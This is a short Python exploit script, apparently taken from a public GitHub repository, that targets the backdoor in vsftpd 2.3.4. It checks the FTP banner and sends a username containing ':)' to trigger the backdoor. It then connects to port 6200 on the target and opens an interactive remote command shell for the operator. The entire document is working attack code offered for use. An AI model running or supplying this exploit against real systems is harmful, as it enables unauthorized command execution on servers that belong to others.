#!/usr/bin/python3
import socket
import time
import sys

tty="""[[ $- == *i* ]] && echo '[+] Interactive' || echo '[-] Not interactive'"""
def exploit(ip,port):
    try:
        print("Author:İbrahim"+"\nhttps://github.com/Andhrimnirr/Python-Vsftpd-2.3.4-Exploit")
        ftp=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        ftp.connect((ip,port))
        check=ftp.recv(1024).decode('utf-8')
        socket.setdefaulttimeout(5)
        if "vsftpd 2.3.4" in check.lower()  :
            ftp.send(b'USER letmein:)\n')
            ftp.send(b'PASS invaild\n')
            time.sleep(2)
            #ftp.close()
            print("[+] SUCCESSFUL CONNECTİON")
        else:
            print("[-] Not work vsftpd 2.3.4")
    except Exception as f:
        print('[-] CONNECTION FAILED')
        print(f)
        ftp.close()
        sys.exit(1)
        

    try:
        arkakapi=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        arkakapi.connect((ip,6200))
        arkakapi.settimeout(1.5)
        print('[*] SESSION CREATED')
        print('[!] Interactive shell to check >> use command shell_check')
        host=str.encode('id -u -n'+'\n')
        arkakapi.send(host)
        hostt=arkakapi.recv(1024).decode('utf-8')
        while True:
            sendnude=input(ip+'@'+str(hostt.strip())+"#: ")
            if sendnude.lower()=='shell_check':
                print('[*]Interactıve shell checked...')
                komut = str.encode((tty+ '\n'))
                arkakapi.send(komut)
                print(arkakapi.recv(1024).decode('utf-8'))
            else:
                try:
                    komut = str.encode((sendnude+'\n'))
                    arkakapi.send(komut)
                    responseq = arkakapi.recv(1024).decode('utf-8')
                    print(responseq)
                except socket.timeout:
                    pass
            
                
            if sendnude.lower()=='exit':
                print('[*] SESSION CLOSED')
                arkakapi.close()
                sys.exit(1)
    except Exception as f:
        print('[!] Failed to connect to backdoor')
        print(f)
if __name__=='__main__':
    if len(sys.argv) < 3:
        print('Usage ./exploit.py <İP> <PORT>')
        print('Example ./exploit.py 127.0.0.1 21')
    else:
        exploit(sys.argv[1],int(sys.argv[2]))
